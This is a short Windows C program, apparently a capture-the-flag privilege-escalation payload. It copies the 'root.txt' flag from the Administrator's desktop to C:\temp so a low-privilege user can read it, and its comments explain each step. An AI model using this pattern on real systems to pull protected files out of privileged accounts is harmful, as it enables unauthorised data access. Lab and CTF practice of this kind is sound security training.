#include <windows.h>
#include <stdio.h>

int main() { 
    // Note: the * is a pointer to the first character of the string, and the rest of the string is automatically read from consecutive memory locations
    const char* root = "C:\\Users\\Administrator\\Desktop\\root.txt"; // path to the root flag file (only accessible by Administrator)

    const char* directory = "C:\\temp\\root.txt"; // path where we want to copy the file (accessible by our current low-privilege user)

    CopyFile(root, directory, FALSE); // copy the file from the source (Administrator's desktop) to our accessible directory
                                      // FALSE means overwrite the destination file if it already exists

    return 0; // indicates successful program execution to the operating system
}